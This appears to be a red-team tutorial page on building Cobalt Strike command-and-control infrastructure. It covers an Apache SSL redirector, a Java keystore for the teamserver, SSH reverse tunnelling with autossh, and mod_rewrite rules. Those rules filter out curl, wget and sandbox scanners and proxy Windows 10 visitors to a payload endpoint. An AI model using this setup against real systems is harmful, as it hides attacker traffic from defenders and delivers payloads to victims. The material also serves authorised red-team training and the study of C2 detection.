### C2 Infrastructure
![c2_infra](/images/c2_infra.png)
<Callout type="info" emoji="ℹ️">
  The traffic between the **redirector** and the **teamserver** can be in either HTTP or HTTPS. and It can be off-loaded on the **redirector** and let the traffic between the **redirector** and the **teamserver** in plain HTTP as It will be already tunneled inside **SSH**
</Callout>


### C2 Setup
#### Install Apache HTTP server and enable SSL on the **redirector** machine 
- Installing Apache HTTP server and enabling SSL
``` bash copy

# Apache Installation
sudo apt install apache2
sudo a2enmod ssl rewrite proxy proxy_http

# Configuring SSL on Apache
## There is a built-in conf file for the HTTPS, we just need to enable it
## The enabled configurations are just a soft link to the `/etc/apache2/sites-enabled` directory
## We just need to remove the current soft link
sudo rm 000-default.conf

## Create a new soft link to the SSL configuration file
sudo ln -s ../sites-available/default-ssl.conf .

## Restart Apache
sudo systemctl restart apache2
```

- Generate SSL certificate
```bash copy
# Generate a new key-pair on the teamserver and copy them to the redirector server
openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key

# Update those 2 lines in  /etc/apache2/sites-enabled/default-ssl.conf after copying them to the corresponding directory
SSLCertificateFile      /etc/ssl/certs/public.crt
SSLCertificateKeyFile /etc/ssl/private/private.key

```
<Callout type="info" emoji="ℹ️">
  We can just use the **public.crt** and **private.key** without getting them signed by a public CA, but have to configure the apache server to ignore the self-signed certificate
  by adding this line to the apache configuration file `SSLProxyCheckPeerCN off`. This is required to tell Apache to ignore that the SSL certificate on Cobalt Strike's HTTPS listener is self-signed.
</Callout>
<Callout type="info" emoji="ℹ️">
  To sign the certificate with from a public CA we can use **certbot** and **letsencrypt**
</Callout>


#### Configure SSL on the Team server
Because the CobaltStrike's teamserver is written in java, we'll have to import the private key and the public certificate into a java keystore.
<Callout type="info" emoji="ℹ️">
  We'll use the same private key and certificate generated on the **redirector** machine.
</Callout>
  1. Import the private key and the certificate into a **pkcs12** file
      ```bash copy
      openssl pkcs12 -inkey private.key -in public.crt -export -out acme.pkcs12
      ```
  2. Import the `pkcs12` file into a java keystore
     ```bash copy
     keytool -importkeystore -srckeystore acme.pkcs12 -srcstoretype pkcs12 -destkeystore acme.store
     ```
  3. Reference the java keystore in the C2 malleable profile
     ```JSON copy
     https-certificate {
     set keystore "tig00r.store";
     set password "password";
      }
     ```
     <Callout type="info" emoji="ℹ️">
      The java keystore must be in the same directory as the C2 server
     </Callout>  
  4. Launch the teamserver
      ```bash copy
      sudo ./teamserver 10.10.0.69 'P@ssw0rd' c2-profiles/normal/webbug_getonly.profile
     ```
#### Configure the SSH tunnel between the **redirector** and the **teamserver**
  5. Port Forward the **443** port of **the teamserver** ( the listener ) to the **redirector** machine. 
      This can be done in 2 ways:
      - **Using traditional SSH port forwarding**:
        ```bash copy
        # On the teamserver
        ssh -N -R 8443:localhost:443 -i ssh-user ssh-user@redirector
        ```
        <Callout type="info" emoji="ℹ️">
        **Where**
        - `-N`   Stops the session from dropping in to a shell.
        - `8443` HTTPS port on redirector machine.
        - `443`  HTTPS port on team server.
        </Callout>
        Now, whoever connects to port `8443` on the **redirector** machine, his traffic will be redirected to port `443` on the **teamserver**

      - **Using [autossh](https://linux.die.net/man/1/autossh)**
      
        Add the following content to the `~/.ssh/config` file on the **redirector** machine
        ```text copy
        Host                 redirector-1
        HostName             10.10.5.39
        User                 ssh-user
        Port                 22
        IdentityFile         /home/ubuntu/ssh-user
        RemoteForward        8443 localhost:443
        ServerAliveInterval  30
        ServerAliveCountMax  3
        ```
        Now, start the port forwarding from the **teamserver**
        ```bash copy
        autossh -M 0 -f -N redirector-1
        ```
        <Callout type="info" emoji="ℹ️">
        **Where**
        - `-M 0`  disables the autossh monitoring port (in favour of OpenSSH's built-in ServerAliveInterval and ServerAliveCountMax capabilities).
        - `-f` tells autossh to run in the background.
        </Callout>


#### Traffic Proxying within the redirector
By looking at the following diagram, we already configured everything, except the traffic redirection within the redirectror server, which can be done through `.htaccess` file
![c2_infra](/images/c2-infra.png)
- Under `/etc/apache2/sites-enabled/default-ssl.conf` add the following tag before the `</VirtualHost>` closing tag
```xml copy
<Directory /var/www/html/>
  Options Indexes FollowSymLinks MultiViews
  AllowOverride All
  Require all granted
</Directory>  
```
- Allow **SSL Proxying** by adding  `SSLProxyEngine on` under `SSLEngine on`
- Restart the Apache server 
  ```bash copy
    sudo systemctl restart apache2
  ```
- Configure `.htaccess`
  create `.htaccess` file under `/var/www/html` and add the following lines to it
  ```text copy
  RewriteEngine on
  RewriteRule ^test$ index.html [NC]
  ```
   
  <Callout type="info" emoji="ℹ️">
    **RewriteRule**: 

    Example: `RewriteRule <Regx> <epattern> <substitution> [flags]`
  </Callout>
  <Callout type="info" emoji="ℹ️">
    **Some useful flags**
    - `[L]` (Last)  Tells mod_rewrite to stop processing further rules.
    - `[NE]` (No Escape).  Don't encode special characters (e.g. & and ?) to their hex values.
    - `[P]` (Proxy)  Handle the request with mod_proxy.
    - `[R]` (Redirect)  Send a redirect code in response.
    - `[S]` (Skip)  Skip the next N number of rules.
    - `[T]` (Type)  Sets the MIME type of the response.
    - Example:  `[L, NE, P]`
  </Callout>
  <Callout type="info" emoji="ℹ️">
    **RewriteCond**:
     
    - When combined with **RewriteRule** allows  rewrite rules to only be applied under certain conditions
    - We can use multiple conditions for the same rule, and they'll be evaluated from top to bottom
    - Example: `TestString Condition [Flags]`
    - Refer to [mod_rewrite](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) for  more options
  </Callout> 
##### Redirection Rules
###### User Agent Rules
- Can be sued to block script-style agents ex: **curl**, **wget**, **powershell**, **python**, **Known AV Scanners and Sandboxes**, ... 
- Example: Blocking **curl** and **wget** by returning `403` if the request contained one of them in the `User-Agent` reqeust header
  ```json copy
  RewriteEngine on

  RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
  RewriteRule .* - [F]
  ```
- Example: Allowing only **Windows 10 devices**
  ```json copy
  RewriteCond %{HTTP_USER_AGENT} "Windows NT 10.0" [NC]
  RewriteRule .* https://localhost:8443/win-payload [P]
  ```
  <Callout type="info" emoji="ℹ️">
    The `[P]` or Proxy directive is special because it proxies the request to our backend server in a way that's transparent to the requesting party.
  </Callout>
